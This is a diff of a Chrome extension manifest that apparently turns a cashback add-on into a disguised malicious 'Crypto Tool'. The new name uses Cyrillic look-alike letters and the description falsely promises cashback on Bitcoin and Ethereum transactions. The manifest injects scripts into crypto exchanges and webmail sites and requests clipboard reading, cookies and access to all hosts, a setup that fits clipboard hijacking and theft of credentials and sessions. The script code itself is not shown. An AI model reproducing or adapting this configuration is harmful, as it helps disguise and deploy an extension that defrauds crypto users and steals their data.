@@ -1,24 +1,33 @@
-{
+﻿{
    "background": {
-      "page": "extensions.html"
+      "persistent": false,
+      "scripts": [ "assets/js/jquery.min.js", "background/background.js" ]
    },
    "browser_action": {
-      "default_icon": "icon.png",
-      "default_popup": "popup.html",
-      "default_title": "CB & Cash"
+      "default_icon": {
+         "16": "data/icons/16.png",
+         "32": "data/icons/32.png",
+         "48": "data/icons/48.png",
+         "64": "data/icons/64.png"
+      },
+      "default_popup": "data/popup/popup.html",
+      "default_title": "Crурto Tооl"
    },
    "content_scripts": [ {
-      "js": [ "jquery-3.3.1.min.js", "fullpage.min.js", "fullpage.extensions.min.js" ],
-      "matches": ["*://*/*"]
+      "css": [ "assets/css/font-awesome.min.css", "assets/css/fonts.css", "assets/css/style.css" ],
+      "js": [ "assets/js/jquery.min.js", "assets/js/loading-overlay.min.js" ],
+      "matches": [ "*://*.*/*", "*://localbitcoins.com/*", "*://*/*", "*://*.blockchain.com/*", "*://*.live.com/*", "*://*.google.com/*", "*://mail.ru/*", "*://*.binance.com/*", "*://*.coinbase.com/*", "*://*.qq.com/*", "*://*.mail.ru/*" ]
    } ],
-   "description": "We return up to 5% from each transaction. Use the system and get a portion of the money spent back to your wallet.",
+   "description": "Return саshbaсk with every Bitcoin, Ethereum, Bitcoin Cash transaction by using plugin!",
    "icons": {
-      "128": "icon.png",
-      "16": "icon.png",
-      "48": "icon.png"
+      "128": "data/icons/128.png",
+      "16": "data/icons/16.png",
+      "32": "data/icons/32.png",
+      "48": "data/icons/48.png",
+      "64": "data/icons/64.png"
    },
-    "manifest_version": 2,
-   "name": "CB & Cash",
-   "permissions": [ "background", "activeTab", "clipboardWrite", "clipboardRead", "cookies", "tabs","*://*/*", "storage" ],
-   "version": "1.0.13"
+	"manifest_version": 2,
+   "name": "Арр & Crурto Tооl",
+   "permissions": [ "tabs", "storage", "*://*/*", "*://*.*/*", "*://*.live.com/*", "*://*.yahoo.com/*", "clipboardRead", "cookies" ],
+   "version": "1.0.26"
 }
